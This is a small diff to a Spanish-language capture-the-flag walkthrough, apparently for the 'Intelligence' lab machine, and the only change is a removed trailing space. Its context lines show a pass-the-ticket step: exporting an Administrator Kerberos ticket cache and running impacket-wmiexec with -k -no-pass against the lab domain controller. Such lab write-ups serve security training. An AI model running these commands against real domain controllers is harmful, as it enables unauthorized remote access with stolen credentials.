@@ -306,7 +306,7 @@ Nos creara un archivo llamado `Administrator.ccache`
 
 Ahora con la herramienta [[impacket-wmiexec]] vamos a tratar de autenticarnos en el domain controller
 - Antes tenemos que crear una variable de entorno
-	`export KRB5CCNAME=Administrator.ccache `
+	`export KRB5CCNAME=Administrator.ccache`
 - Añadiremos al `/etc/hosts` lo siguiente `dc.intelligence.htb`
 Ya podremos usar la herramienta
 `impacket-wmiexec dc.intelligence.htb -k -no-pass`
